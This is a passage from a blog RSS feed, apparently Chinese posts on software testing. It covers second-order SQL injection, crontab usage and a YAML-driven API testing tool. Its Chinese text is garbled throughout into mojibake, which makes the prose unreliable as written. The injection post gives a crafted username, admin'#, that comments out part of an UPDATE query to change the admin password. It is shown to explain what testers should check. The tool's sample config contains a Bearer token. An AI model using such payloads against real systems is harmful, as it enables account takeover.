<li>2.å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œç¨‹åºå°±è®¤ä¸ºè¯¥æ•°æ®æ˜¯å®‰å…¨çš„ï¼Œä¸‹ä¸€æ¬¡éœ€è¦è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥å’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆäºŒæ¬¡æ³¨å…¥</li>
</ul>
<h4 id="ä¾‹å­">ä¾‹å­</h4>
<p>å‡å¦‚è¯¥ç³»ç»Ÿçš„æ•°æ®åº“ä¸º<code>mysql</code></p>
<ul>
<li>
<p>1.å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç”¨æˆ·åä¸º<code>admin</code></p>
</li>
<li>
<p>2.å†æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç”¨æˆ·åä¸º<code>admin'#</code></p>
</li>
<li>
<p>3.ç„¶åä¿®æ”¹<code>admin'#</code>ç”¨æˆ·çš„å¯†ç </p>
<p>å½“ä¿®æ”¹<code>admin'#</code>çš„æ—¶å€™å°±ä¼šäº§ç”ŸSQLæ³¨å…¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="c1">#&#39; and passwd = &#39;oldPassword&#39;
</span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„sqlå¦‚æœæ²¡æœ‰å¯¹<code>admin'#</code>åšæ ¡éªŒçš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šæˆåŠŸæ³¨å…¥ï¼Œæœ€ç»ˆæ‰§è¡Œçš„sqlä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±æˆåŠŸçš„æŠŠadminç”¨æˆ·çš„å¯†ç ä¿®æ”¹æ‰äº†</p>
</li>
<li>
<p>å¦‚æœæ²¡æœ‰å¯¹ç”¨æˆ·åçš„å…¥å‚åšæ ¡éªŒçš„è¯ï¼Œç”šè‡³å¯ä»¥åœ¨ç”¨æˆ·ååè¾“å…¥ä¸€äº›sqlè¯­å¥æ¥è·å–æ•°æ®åº“çš„ä¸€äº›ä¿¡æ¯ï¼Œæˆ–è€…è¿›è¡Œåˆ é™¤æ“ä½œ</p>
</li>
<li>
<p>è¿™ç§åœºæ™¯ä¼šæœ‰å¾ˆå¤šï¼Œä¸åªæ˜¯åªæœ‰ç™»å½•åœºæ™¯å­˜åœ¨ï¼Œæ‰€ä»¥æµ‹è¯•æ—¶è¦è€ƒè™‘çš„è¶³å¤Ÿå…¨é¢</p>
</li>
</ul>
]]></description>
</item><item>
    <title>crontab</title>
    <link>https://testoai.github.io/posts/crontab/</link>
    <pubDate>Sun, 18 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/crontab/</guid>
    <description><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»</h2>
<p><code>crontab</code>åœ¨<code>Linux</code>ç³»ç»Ÿä¸­ç”¨äºæ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼Œæ¯”å¦‚æœåŠ¡å·¡æ£€ï¼Œæ—¥å¿—å¤‡ä»½æ¸…ç†ï¼Œæ•°æ®åº“å¤‡ä»½</p>
<p>åœ¨<code>Centos7</code>ä¸­ï¼Œæœ€å°å®‰è£…ä¼šæœ‰è¯¥æœåŠ¡ï¼Œè¿›ç¨‹åæ˜¯<code>crond</code></p>
<h2 id="crontabæ–‡ä»¶è¯¦è§£"><code>crontab</code>æ–‡ä»¶è¯¦è§£</h2>
<ul>
<li>
<p>1.<code>/var/spool/cron/</code>ï¼šè¯¥ç›®å½•å­˜æ”¾ç€æ¯ä¸ªç”¨æˆ·è®¾ç½®çš„ä»»åŠ¡ï¼Œæ–‡ä»¶ä»¥ç”¨æˆ·åå‘½å</p>
</li>
<li>
<p>2.<code>/var/log/cron</code>ï¼šè¯¥æ–‡ä»¶æ˜¯<code>crontab</code>çš„æ—¥å¿—æ–‡ä»¶ï¼Œå½“ä»»åŠ¡æ‰§è¡Œæ²¡æœ‰æˆåŠŸæ—¶å¯ä»¥æŸ¥çœ‹è¯¥æ—¥å¿—æ’æŸ¥</p>
</li>
<li>
<p>3.<code>/etc/crontab</code>ï¼šè¯¥æ–‡ä»¶ç”¨æ¥ç®¡ç†å®šæ—¶ä»»åŠ¡ï¼Œé»˜è®¤æœ‰<code>root</code>ç”¨æˆ·å¯ä»¥ç¼–è¾‘å¯ä»¥ä¿®æ”¹æƒé™ç»™å…¶ä»–ç”¨æˆ·ç¼–è¾‘</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
<span class="nv">PATH</span><span class="o">=</span>/sbin:/bin:/usr/sbin:/usr/bin
<span class="nv">MAILTO</span><span class="o">=</span>root

<span class="c1"># For details see man 4 crontabs</span>

<span class="c1"># Example of job definition:</span>
<span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># | .------------- hour (0 - 23)</span>
<span class="c1"># | | .---------- day of month (1 - 31)</span>
<span class="c1"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># | | | | |</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="é¡¶éƒ¨ç¯å¢ƒç›¸å…³éƒ¨åˆ†">é¡¶éƒ¨ç¯å¢ƒç›¸å…³éƒ¨åˆ†</h3>
<ul>
<li><code>SHELL=/bin/bash</code>ï¼šè¡¨ç¤ºä½¿ç”¨<code>/bin/bash</code>è§£é‡Šå‘½ä»¤</li>
<li><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code>ï¼šè¡¨ç¤ºåˆ°å“ªäº›ç›®å½•å¯»æ‰¾å‘½ä»¤æ‰§è¡Œç¨‹åº</li>
<li><code>MAILTO</code>ï¼šå½“æŸä¸ªä»»åŠ¡æ‰§è¡Œæœ‰è¾“å‡ºæ—¶ï¼Œè¾“å‡ºå†…å®¹å°†å‘é€åˆ°é‚£ä¸ªç”¨æˆ·çš„é‚®ç®±ï¼Œä¸ºç©ºåˆ™ä¸å‘é€</li>
</ul>
<h3 id="åº•éƒ¨å®šæ—¶ä»»åŠ¡é…ç½®éƒ¨åˆ†">åº•éƒ¨å®šæ—¶ä»»åŠ¡é…ç½®éƒ¨åˆ†</h3>
<ul>
<li>ä¸‹é¢æ˜¯æ•´ä¸ªæ–‡ä»¶çš„æ ¸å¿ƒéƒ¨åˆ†</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># | .------------- hour (0 - 23)</span>
<span class="c1"># | | .---------- day of month (1 - 31)</span>
<span class="c1"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># | | | | |</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="æ—¶é—´éƒ¨åˆ†">æ—¶é—´éƒ¨åˆ†</h4>
<p><code>* * * * *</code>è¡¨ç¤ºçš„æ˜¯æ—¶é—´é…ç½®</p>
<ul>
<li>ç¬¬ä¸€ä¸ª*è¡¨ç¤ºåˆ†é’Ÿï¼Œå–å€¼èŒƒå›´åœ¨0~59ä¹‹é—´çš„æ•´æ•°</li>
<li>ç¬¬äºŒä¸ª*è¡¨ç¤ºå°æ—¶ï¼Œå–å€¼èŒƒå›´åœ¨0~23ä¹‹é—´çš„æ•´æ•°</li>
<li>ç¬¬ä¸‰ä¸ª*è¡¨ç¤ºæ—¥æœŸï¼Œæ ¹æ®ä¸‹é¢æŒ‡å®šæœˆä»½ä¸­çš„å¤©æ•°å–å€¼</li>
<li>ç¬¬å››ä¸ª*è¡¨ç¤ºæœˆä»½ï¼Œå–å€¼èŒƒå›´åœ¨1~12ä¹‹é—´çš„æ•´æ•°</li>
<li>ç¬¬äº”ä¸ª*è¡¨ç¤ºæ˜ŸæœŸï¼Œå–å€¼èŒƒå›´åœ¨1~7ä¹‹é—´çš„æ•´æ•°</li>
</ul>
<p>ç‰¹æ®Šç¬¦å·ï¼š</p>
<ul>
<li><code>*</code>ï¼šä»£è¡¨è§„åˆ™èŒƒå›´å†…çš„ä»»æ„å€¼ï¼Œå¦‚æœè®¾ç½®è¯¥å€¼çš„æ˜¯åˆ†é’Ÿï¼Œåˆ™åœ¨æ»¡è¶³å…¶ä»–æ¡ä»¶ä¸‹çš„æƒ…å†µä¸‹ï¼Œæ¯åˆ†é’Ÿéƒ½ä¼šæ‰§è¡Œ</li>
<li><code>,</code>ï¼šå°†æŒ‡å®šçš„å€¼éš”å¼€ï¼Œå¦‚åœ¨åˆ†é’Ÿä¸­ä½¿ç”¨ï¼Œ<code>1,18,23</code>ï¼Œåœ¨æ»¡è¶³å…¶ä»–æ¡ä»¶æƒ…å†µä¸‹ï¼Œåœ¨1ã€18ã€23åˆ†é’Ÿéƒ½ä¼šæ‰§è¡Œ</li>
<li><code>-</code>ï¼šç”¨äºæŒ‡å®šå–å€¼èŒƒå›´ï¼Œå¦‚åœ¨åˆ†é’Ÿä¸­ä½¿ç”¨ï¼Œ<code>1-5</code>ï¼Œåˆ™è¡¨ç¤ºçš„æ˜¯1ã€2ã€3ã€4ã€5åˆ†é’Ÿ</li>
<li><code>/</code>ï¼šç”¨äºæŒ‡å®šæ—¶é—´çš„æ‰§è¡Œé¢‘ç‡ï¼Œå¦‚åœ¨åˆ†é’Ÿä¸­ä½¿ç”¨ï¼Œ<code>0-30/2</code>ï¼Œåˆ™è¡¨ç¤ºçš„æ˜¯åœ¨30åˆ†é’Ÿä¹‹å†…ï¼Œæ¯éš”ä¸¤åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</li>
</ul>
<h4 id="æ—¶é—´é…ç½®éªŒè¯">æ—¶é—´é…ç½®éªŒè¯</h4>
<p><code>https://crontab.guru/</code></p>
<p>ä¸Šé¢ç½‘å€ä¼šå¯¹é…ç½®çš„æ—¶é—´éªŒè¯</p>
<h4 id="å‘½ä»¤éƒ¨åˆ†">å‘½ä»¤éƒ¨åˆ†</h4>
<p><code>user-name command to be executed</code>è¡¨ç¤ºçš„æ˜¯ç”¨æˆ·å’Œæ‰§è¡Œçš„å‘½ä»¤</p>
<p>å› ä¸ºç¯å¢ƒå˜é‡çš„åŸå› ï¼Œå¯èƒ½æœ‰å¾ˆå¤šåœ¨ç»ˆç«¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ”¾åˆ°<code>crontab</code>é‡Œé¢æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥æœ€å¥½å†™ç»å¯¹è·¯å¾„</p>
<p>ç¯å¢ƒå˜é‡çš„é—®é¢˜ä¸‹é¢ä¼šè¯¦ç»†å†™ä¸‹ï¼Œç°åœ¨å…ˆå†™ä¸€ä¸ªä¾‹å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback"># .---------------- minute (0 - 59)
# | .------------- hour (0 - 23)
# | | .---------- day of month (1 - 31)
# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...
# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# | | | | |
# * * * * * user-name command to be executed
  */2 * * * * /usr/sbin/ntpdate s1a.time.edu.cn
</code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„ä¾‹å­æ˜¯æ¯ä¸¤åˆ†é’ŸåŒæ­¥ä¸€æ¬¡<code>s1a.time.edu.cn</code>çš„æ—¶é—´</p>
<h2 id="crontabçš„ç¯å¢ƒå˜é‡">crontabçš„ç¯å¢ƒå˜é‡</h2>
<p><code>crontab</code>é»˜è®¤ä¸ä¼šåŠ è½½ç”¨æˆ·å’Œç³»ç»Ÿè®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¸€äº›å‘½ä»¤åœ¨ç»ˆç«¯å¯ä»¥æ‰§è¡Œä½†æ˜¯åœ¨<code>crontab</code>æ‰§è¡Œä¸äº†</p>
<ul>
<li>è§£å†³æ–¹æ³•
<ul>
<li>1.åœ¨<code>crontab</code>æ·»åŠ ä»»åŠ¡æ—¶å†™ç»å¯¹è·¯å¾„</li>
<li>2.æŠŠåˆ·æ–°ç¯å¢ƒå˜é‡çš„å‘½ä»¤æ·»åŠ åˆ°<code>crontab</code>ä¸­ï¼Œåªé€‚ç”¨äº<code>root</code>ç”¨æˆ·</li>
<li>3.å¯ä»¥åœ¨å¯¹åº”çš„ä»»åŠ¡ä¹‹å‰æ·»åŠ ä¸€æ®µä½¿ç³»ç»Ÿç¯å¢ƒå˜é‡ç”Ÿæ•ˆçš„å‘½ä»¤</li>
<li>4.å¯ä»¥æŠŠè¦æ‰§è¡Œçš„æ–‡ä»¶æ‰€åœ¨ç›®å½•æ·»åŠ åˆ°<code>PATH</code>ä¸­</li>
</ul>
</li>
</ul>
<h2 id="crontabç›¸å…³å‘½ä»¤">crontabç›¸å…³å‘½ä»¤</h2>
<p><code>crontab -l</code>ï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„æ‰€æœ‰ä»»åŠ¡</p>
<p><code>crontab -e</code>ï¼šç¼–è¾‘å½“å‰ç”¨æˆ·çš„ä»»åŠ¡ï¼Œä¸Šé¢è¯´æ™®é€šç”¨æˆ·æ²¡æœ‰åŠæ³•æŠŠä»»åŠ¡åŠ åˆ°<code>/etc/crontab</code>ä¸­ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨è¿™æ¡å‘½ä»¤æ·»åŠ å±äºè‡ªå·±çš„ä»»åŠ¡ï¼Œæ ¼å¼ä¸<code>/etc/crontab</code>ç›¸åŒ</p>
<p><code>crontab /etc/crontab</code>ï¼šç”¨äº<code>root</code>ç”¨æˆ·ç¼–è¾‘å®Œ<code>/etc/crontab</code>ååˆ·æ–°ä»»åŠ¡åˆ—è¡¨</p>
<p><code>crontab -r</code>ï¼šåˆ é™¤å½“å‰ç”¨æˆ·çš„æ‰€æœ‰ä»»åŠ¡ï¼Œ<strong><u>æ³¨æ„æ˜¯åˆ é™¤æ‰€æœ‰ï¼Œæ…ç”¨</u></strong></p>
]]></description>
</item><item>
    <title>æ¥å£æµ‹è¯•å°å·¥å…·æ–‡æ¡£</title>
    <link>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/</link>
    <pubDate>Sat, 17 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/</guid>
    <description><![CDATA[<h2 id="æ”¯æŒçš„è¯·æ±‚æ–¹å¼">æ”¯æŒçš„è¯·æ±‚æ–¹å¼</h2>
<ul>
<li>æ”¯æŒ<code>GET</code>è¯·æ±‚</li>
<li>æ”¯æŒ<code>POST</code>è¯·æ±‚</li>
</ul>
<h2 id="æ”¯æŒçš„è¯·æ±‚ä½“ç±»å‹">æ”¯æŒçš„è¯·æ±‚ä½“ç±»å‹</h2>
<ul>
<li>æ”¯æŒ<code>json</code>æ ¼å¼</li>
<li>æ”¯æŒ<code>multipart/form-data</code>æ ¼å¼</li>
</ul>
<h2 id="è¿”å›å€¼ç›¸å…³">è¿”å›å€¼ç›¸å…³</h2>
<ul>
<li>æ”¯æŒè¿”å›å€¼æ‹¼æ¥ï¼Œåœ¨<code>respParams</code>å‚æ•°ä¸­å†™å…¥<code>GET</code>å’Œ<code>SET</code>çš„<code>kay</code>ï¼Œä½¿ç”¨æ–¹å¼è§ä¸‹é¢å‚æ•°è§£é‡Š</li>
</ul>
<h1 id="20210415">2021.04.15</h1>
<h2 id="é…ç½®æ–‡ä»¶">é…ç½®æ–‡ä»¶</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">case1</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;{
</span><span class="s1">        &#34;method&#34;:&#34;POST&#34;,
</span><span class="s1">        &#34;header&#34;:{
</span><span class="s1">            &#34;content-Type&#34;:&#34;application/json&#34;,
</span><span class="s1">            &#34;Authorization&#34;:&#34;Bearer d15a43e2-ade8-4566-95b6-b3f7e7821d63&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;bodyType&#34;:&#34;multipart/form-data&#34;,
</span><span class="s1">        &#34;body&#34;:{
</span><span class="s1">            &#34;sourceSystem&#34;: &#34;corex&#34;,
</span><span class="s1">            &#34;stAppno&#34;: &#34;200000030139&#34;,
</span><span class="s1">            &#34;stGrpNo&#34;: &#34;2&#34;,
</span><span class="s1">            &#34;rpFindings&#34;: &#34;test1&#34;,
</span><span class="s1">            &#34;rpInspectCon&#34;: &#34;testç»“è®º&#34;,
</span><span class="s1">            &#34;osrContent&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpKeyword&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpChkUserId&#34;: &#34;manager&#34;,
</span><span class="s1">            &#34;rpChkUsername&#34;: &#34;ç®¡ç†å‘˜&#34;,
</span><span class="s1">            &#34;rpChkDt&#34;: &#34;2020-07-01T18:42:40.000&#34;,
</span><span class="s1">            &#34;rpPositivePpt&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpCriticalGrade&#34;: &#34;&#34;,
</span><span class="s1">            &#34;tisID&#34;: &#34;df319296aa714e4dafef813781f6b7a1&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;files&#34;:{
</span><span class="s1">            &#34;file&#34;:&#34;C:/Users/rui/Pictures/Saved Pictures/test.png&#34;,
</span><span class="s1">            &#34;file1&#34;:&#34;C:/Users/rui/Pictures/Saved Pictures/test.png&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;respParams&#34;:{
</span><span class="s1">            &#34;data,token_type&amp;data,access_token&#34;:&#34;case3,header,Authorization&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;&#34;
</span><span class="s1">    }&#39;</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><code>method</code>ï¼šå‚æ•°å€¼ï¼š<code>GET</code>ã€<code>POST</code></p>
</li>
<li>
<p><code>header</code>ï¼šé”®å€¼å¯¹</p>
</li>
<li>
<p><code>bodyType</code>ï¼šå‚æ•°å€¼ï¼š</p>
<ul>
<li><code>urlParams</code>ï¼šå¦‚æœæ˜¯<code>URL</code>ä¸Šçš„å‚æ•°å†™åˆ°<code>body</code>ä¸­çš„æ—¶å€™ï¼Œ<code>bodyType</code>éœ€è¦å†™å…¥è¯¥å€¼</li>
<li><code>json</code>ï¼š<code>json</code>å½¢å¼çš„è¯·æ±‚ä½“</li>
<li><code>multipart/form-data</code>ï¼šè¡¨å•æ ¼å¼çš„è¯·æ±‚ä½“</li>
</ul>
</li>
<li>
<p><code>body</code>ï¼šé”®å€¼å¯¹ï¼Œæ”¯æŒåµŒå¥—</p>
<ul>
<li><code>GET</code>ï¼š<code>url</code>ä¸Šçš„é”®å€¼å¯¹å¯ä»¥å†™åˆ°<code>body</code>ä¸Šï¼Œä¸èƒ½åµŒå¥—</li>
<li><code>POST</code>ï¼šæ”¯æŒåµŒå¥—çš„<code>json</code>ç±»å‹</li>
<li>è¡¨å•æ ¼å¼ï¼šé”®å€¼å¯¹çš„å‚æ•°å¯ä»¥å†™åˆ°<code>body</code>ä¸Šï¼Œå¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œå†™åˆ°ä¸‹é¢çš„<code>files</code></li>
</ul>
</li>
<li>
<p><code>files</code>ï¼šé”®ä¸ºæ–‡ä»¶çš„<code>key</code>ï¼Œå€¼ä¸ºæ–‡ä»¶åœ°å€ï¼Œå¯ä»¥å†™å¤šä¸ªé”®å€¼å¯¹ï¼Œä¸èƒ½åµŒå¥—</p>
</li>
<li>
<p><code>response</code>ï¼šå°†<code>json</code>è¿”å›å€¼çš„å‚æ•°å–å‡ºï¼Œå†™å…¥åˆ°å…¶å®ƒ<code>case</code>çš„å‚æ•°ä¸­</p>
<ul>
<li>
<p>ä¸€ä¸ªå‚æ•°å¯¹åº”ä¸€ä¸ªå‚æ•°ï¼Œå–<code>data,token_type</code>ä¸­çš„å‚æ•°æ”¾åˆ°<code>case3,header,Authorization</code>ä¸­</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">response:</span><span class="p">{</span>
	<span class="nt">&#34;data,token_type&#34;</span><span class="p">:</span><span class="s2">&#34;case3,header,Authorization&#34;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>å¤šä¸ªå‚æ•°å¯¹åº”ä¸€ä¸ªå‚æ•°ï¼Œå–<code>data,token_type</code>å’Œ<code>data,access_token</code>ä¸­çš„å€¼æ‹¼æ¥èµ·æ¥æ”¾åˆ°<code>case3,header,Authorization</code>ä¸­</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">response:</span><span class="p">{</span>
	<span class="nt">&#34;data,token_type&amp;data,access_token&#34;</span><span class="p">:</span><span class="s2">&#34;case3,header,Authorization&#34;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
</ul>
]]></description>
</item><item>
    <title>æ¥å£æµ‹è¯•å°å·¥å…·</title>
    <link>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
    <pubDate>Sun, 11 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
    <description><![CDATA[<ul>
<li>å¼€ç¯‡å•°å—¦</li>
</ul>
<p>è¿™ç¯‡åºŸè¯å¤ªå¤šäº†ï¼Œå†™çš„ä¹Ÿå¤ªä¹±äº†ï¼Œåšå®Œäº†æ–°å¼€ä¸€ç¯‡æ€»ç»“çš„</p>
<p>ä¹‹å‰ä¹Ÿå†™è¿‡æ¥å£æµ‹è¯•å·¥å…·ï¼Œä¸è¿‡æµ‹è¯•æ•°æ®æ˜¯æ”¾åˆ°Excelé‡Œé¢ç»´æŠ¤çš„</p>
<p>å‰æ®µæ—¶é—´å’Œä¸¤ä¸ªæµ‹è¯•å¤§ä½¬èŠï¼Œä»–ä»¬å¥½åƒä¸å¤ªçœ‹å¥½æŠŠæµ‹è¯•æ•°æ®ç»´æŠ¤åˆ°Excelé‡Œé¢</p>
<p>æ‰€ä»¥ç°åœ¨åˆ©ç”¨ä¸šä½™æ—¶é—´é‡æ–°åšä¸€ä¸ªï¼ŒæŠŠæ•°æ®æ”¾åˆ°é…ç½®æ–‡ä»¶é‡Œé¢</p>
<p>æ€è·¯å’Œè¿‡ç¨‹è¿˜æœ‰è¿›åº¦å°±å±•ç¤ºåœ¨è¿™é‡Œäº†</p>
<p>å•¥æ—¶å€™æœ‰é›å½¢çš„æ—¶å€™å°±æ”¾åˆ°<code>github</code>ä¸Šå»</p>
<h2 id="20210417-1240æ›´æ–°">2021.04.17 12:40æ›´æ–°</h2>
<h2 id="å·²ç»å®Œæˆçš„">å·²ç»å®Œæˆçš„</h2>
<p>2021.04.17 12:40</p>
<ul>
<li>1.è¯»å–é…ç½®æ–‡ä»¶</li>
<li>2.å‘é€è¯·æ±‚</li>
<li>3.æŠŠæŒ‡å®šçš„è¿”å›å€¼æ‹¼æ¥åˆ°æŒ‡å®šçš„<code>KEY</code>ä¸Š</li>
</ul>
<p>2021.04.24</p>
<ul>
<li>4.å¯¹æŒ‡å®šçš„è¿”å›å€¼åšåˆ¤æ–­</li>
</ul>
<h2 id="ä¸‹ä¸€æ­¥çš„è®¡åˆ’">ä¸‹ä¸€æ­¥çš„è®¡åˆ’</h2>
<p>2021.04.17 12:40</p>
<ul>
<li><del>1.å¯¹æŒ‡å®šçš„è¿”å›å€¼åšåˆ¤æ–­</del></li>
<li>2.å†™ä¸€ä¸ªæ—¥å¿—æ¨¡å—</li>
<li>3.æŠŠ<code>case</code>çš„<code>val</code>æ¢æˆ<code>yaml</code>æ ¼å¼çš„ï¼ˆè¿™å‘¨çœ‹åˆ°äº†ä¸€ä¸ªyamlçš„è¯¦ç»†æ•™ç¨‹ï¼Œä¸æ˜¯ä¸å¥½è§£æï¼Œè€Œæ˜¯æˆ‘ä¸ä¼šğŸ˜“ï¼‰</li>
</ul>
<h2 id="githubåœ°å€"><code>Github</code>åœ°å€</h2>
<p><code>https://github.com/ongrui/code200</code></p>
<h2 id="20210410-2338">2021.04.10 23:38</h2>
<p>å‘¨äº”å¼€å§‹åšçš„ï¼Œç›®å‰å…ˆæŠŠé…ç½®æ–‡ä»¶çš„æ€è·¯è®²ä¸€ä¸‹</p>
<h3 id="é…ç½®æ–‡ä»¶">é…ç½®æ–‡ä»¶</h3>
<ul>
<li>æ¥å£åœ°å€æ”¾åˆ°ä¸€ä¸ª<code>yaml</code>æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªæ¥å£çš„caseæ”¾åˆ°ä¸€ä¸ª<code>yaml</code>æ–‡ä»¶ä¸­</li>
</ul>
<h4 id="urlå­˜æ”¾çš„é…ç½®æ–‡ä»¶">URLå­˜æ”¾çš„é…ç½®æ–‡ä»¶</h4>
<ul>
<li><code>conn.yaml</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">url</span><span class="p">:</span><span class="w">
